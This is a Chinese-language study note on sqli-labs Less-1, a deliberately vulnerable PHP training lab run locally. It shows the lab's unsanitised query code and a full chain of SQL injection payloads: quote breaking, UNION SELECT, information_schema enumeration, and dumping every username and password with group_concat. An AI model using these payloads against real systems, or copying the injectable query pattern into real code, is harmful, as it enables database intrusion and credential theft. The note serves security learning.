---
title: sqli-labs学习笔记_01
categories:
- sqli-labs
tags:
- sql注入
updated: 2018-06-06
---

**第一节：GET – Error based – Single quotes – String **(基于错误的get单引号字符型注入)

可以在你的php文件中加上一句话:echo "你的sql语句是：

```php+HTML
echo "你的sql语句是：".$sql."<br>";
```

代码如下：

~~~php+HTML
<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml">
<head>
<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
<title>Less-1 **Error Based- String**</title>
</head>

<body bgcolor="#000000">
<div style=" margin-top:70px;color:#FFF; font-size:23px; text-align:center">Welcome&nbsp;&nbsp;&nbsp;<font color="#FF0000"> Dhakkan </font><br>
<font size="3" color="#FFFF00">

<?php
//including the Mysql connect parameters.
include("../sql-connections/sql-connect.php");
error_reporting(0);
// take the variables 
if(isset($_GET['id']))
{
$id=$_GET['id'];
//logging the connection parameters to a file for analysis.
$fp=fopen('result.txt','a');
fwrite($fp,'ID:'.$id."\n");
fclose($fp);

// connectivity 

$sql="SELECT * FROM users WHERE id='$id' LIMIT 0,1";
echo "你的sql语句是：".$sql."<br>";
$result=mysql_query($sql);
$row = mysql_fetch_array($result);

```
if($row)
{
```

  	echo "<font size='5' color= '#99FF00'>";
  	echo 'Your Login name:'. $row['username'];
  	echo "<br>";
  	echo 'Your Password:' .$row['password'];
  	echo "</font>";
  	}
	else 
	{
	echo '<font color= "#FFFF00">';
	print_r(mysql_error());
	echo "</font>";  
	}
}
	else { echo "Please input the ID as parameter with numeric value";}

?>
</font> </div></br></br></br><center>
<img src="C:/Users/Administrator/images/Less-1.jpg" /></center>
</body>
</html>


~~~



 当使用http://127.0.0.1/Less-1/?id=1的时候：

<img src="C:/Users/Administrator/Desktop/%7B%7B%20site.url%20%7D%7D/assets/blog_images/sqli-labs_01_01.png" />

然后在后面加上'看下 

<img src="C:/Users/Administrator/Desktop/%7B%7B%20site.url%20%7D%7D/assets/blog_images/sqli-labs_01_02.png" />

报了sql语句的语法错误，因为没有过滤单引号，原来的查询语句是这样的：

sql="SELECT * FROM users WHERE id='$id' LIMIT 0,1";

SELECT * FROM users WHERE id ='$id' LIMIT 0,1   如果加了'之后就变成了' "   这个时候肯定就会报错的。

也可以使用如下进行检验：

http://127.0.0.1/Less-1/?id=1' or '1' = '1

实际查询语句是： SELECT * FROM users WHERE id = '1' or '1' = '1' LIMIT 0,1

或者是： http://127.0.0.1/Less-1/?id=1' or 1=1 --+

实际查询语句是： SELECT * FROM users WHERE id = '1' or 1=1 --+ LIMIT 0,1

使用order by 来判断users表中有几列：

http://127.0.0.1/Less-1/?id=1'order by 1%23                 %23就是#的编码

<img src="C:/Users/Administrator/Desktop/%7B%7B%20site.url%20%7D%7D/assets/blog_images/sqli-labs_01_03.png" />

http://127.0.0.1/Less-1/?id=1'order by 1,2,3%23

<img src="C:/Users/Administrator/Desktop/%7B%7B%20site.url%20%7D%7D/assets/blog_images/sqli-labs_01_04.png" />

在这里面，1，2，3都是正常的，到4的时候开始报错了

http://127.0.0.1/Less-1/?id=1'order by 1,2,3,4%23

<img src="C:/Users/Administrator/Desktop/%7B%7B%20site.url%20%7D%7D/assets/blog_images/sqli-labs_01_05.png" />

这个就提示我们确定了没有第四列，接下来使用union来查询：

http://127.0.0.1/Less-1/?id=1'union select 1,2,3%23

<img src="C:/Users/Administrator/Desktop/%7B%7B%20site.url%20%7D%7D/assets/blog_images/sqli-labs_01_06.png" />

在mysql_fetch_array()函数只被调用了一次，而mysql_fetch_array() 函数从结果集中取得一行作为关联数组，或数字数组，或二者兼有，具体可以看<http://www.w3school.com.cn/php/func_mysql_fetch_array.asp>，所以这里无论怎么折腾最后只会出来第一行的查询结果 

```php
$sql="SELECT * FROM users WHERE id='$id' LIMIT 0,1";
echo "你的sql语句是：".$sql."<br>";
$result=mysql_query($sql);
$row = mysql_fetch_array($result);

	if($row)
	{
  	echo "<font size='5' color= '#99FF00'>";
  	echo 'Your Login name:'. $row['username'];
  	echo "<br>";
  	echo 'Your Password:' .$row['password'];
  	echo "</font>";
  	}
	else 
	{
	echo '<font color= "#FFFF00">';
	print_r(mysql_error());
	echo "</font>";  
	}
}
	else { echo "Please input the ID as parameter with numeric value";}

?>
```

 那么我们只要让第一行查询的结果是空集（即union左边的select子句查询结果为空），那么我们union右边的查询结果自然就成为了第一行，就打印在网页上了，这个id他一般传的是数字，而且一般都是从1开始自增的，我们可以把id值设为非正数（负数或0），浮点数，字符型或字符串都行：

http://127.0.0.1/Less-1/?id=-1'union select 1,2,3%23

http://127.0.0.1/Less-1/?id=0'union select 1,2,3%23

http://127.0.0.1/Less-1/?id=abcd'union select 1,2,3%23

结果都是一样的

 <img src="C:/Users/Administrator/Desktop/%7B%7B%20site.url%20%7D%7D/assets/blog_images/sqli-labs_01_07.png" />

接下来我们就利用 2，3来查询数据库的信息，需要用到的函数有：

concat_ws（）：从数据库里取N个字段，然后组合到一起用符号分割显示，第一个参数剩余参数间的分隔符

char（）：将十进制ASCII码转化成字符

user（）：返回当前数据库连接使用的用户

database（）：返回当前数据库连接使用的数据库

version（）：返回当前数据库的版本

构造一句话如下：

http://127.0.0.1/Less-1/?id=-1' union select 1,2,(concat_ws(char(32,58,32),user(),database(),version())) %23

其中： 32表示空格      58代表 ：

返回结果：

​                    Your Password:root@localhost : security : 5.5.53 

<img src="C:/Users/Administrator/Desktop/%7B%7B%20site.url%20%7D%7D/assets/blog_images/sqli-labs_01_08.png" />

知道数据库名了，接下来就是拆解表了。

首先说一下mysql的数据库information_schema，他是系统数据库，安装完就有，记录是当前数据库的数据库，表，列，用户权限等信息，下面说一下常用的几个表

SCHEMATA表：储存mysql所有数据库的基本信息，包括数据库名，编码类型路径等，show databases的结果取之此表。

TABLES表：储存mysql中的表信息，（当然也有数据库名这一列，这样才能找到哪个数据库有哪些表嘛）包括这个表是基本表还是系统表，数据库的引擎是什么，表有多少行，创建时间，最后更新时间等。show  tables from schemaname的结果取之此表

COLUMNS表：提供了表中的列信息，（当然也有数据库名和表名称这两列）详细表述了某张表的所有列以及每个列的信息，包括该列是那个表中的第几列，列的数据类型，列的编码类型，列的权限，列的注释等。是show columns from schemaname.tablename的结果取之此表。

注意，查询information_schema中的信息时，使用where语句，那个值不能直接用英文，要用单引号包裹着，当然用其十六进制表示也可以，数值类型的就不用单引号了，这对过滤单引号应该有指导意义。

security的十六进制转换是：0x7365637572697479

16进制转换地址：<http://www.bejson.com/convert/ox2str/>

构造：

http://127.0.0.1./Less-1/?id=-1' union select 1,2,table_name from information_schema.tables where table_schema=0x7365637572697479 %23

<img src="C:/Users/Administrator/Desktop/%7B%7B%20site.url%20%7D%7D/assets/blog_images/sqli-labs_01_09.png" />

只返回了一个table，好像是没有什么用处。这时我们就要用的limit了， 第一个参数是结果集中的第几个，跟C语言的数组的索引一致，第二个参数就是个数

如 limit  1,2  :返回第二行和第三行，因为1表示是第二行，2表示行数是2

构造如下：

http://127.0.0.1./Less-1/?id=-1' union select 1,2,table_name from information_schema.tables where table_schema=0x7365637572697479 limit 2,1%23

<img src="C:/Users/Administrator/Desktop/%7B%7B%20site.url%20%7D%7D/assets/blog_images/sqli-labs_01_10.png" />

不断变化limit的第一个参数即可枚举所有的表，一旦超出范围，会返回空集 

http://127.0.0.1./Less-1/?id=-1' union select 1,2,table_name from information_schema.tables where table_schema=0x7365637572697479 limit 5,1%23

这个时候返回的就是空集：

<img src="C:/Users/Administrator/Desktop/%7B%7B%20site.url%20%7D%7D/assets/blog_images/sqli-labs_01_11.png" />

接下来列举users的列名 ，同样也是用limit一个一个来，就知道字段有id，username，password 

也可以使用一种简单的方法：

直接使用 group_concat函数，该函数返回一个字符串结果，该结果由分组中的值连接组合而成 

http://127.0.0.1./Less-1/?id=-1' union select 1,group_concat(char(32),username,char(32)),group_concat(char(32),password,char(32)) from users --+

<img src="C:/Users/Administrator/Desktop/%7B%7B%20site.url%20%7D%7D/assets/blog_images/sqli-labs_01_12.png" />

(个人学习笔记，部分转自互联网)













 








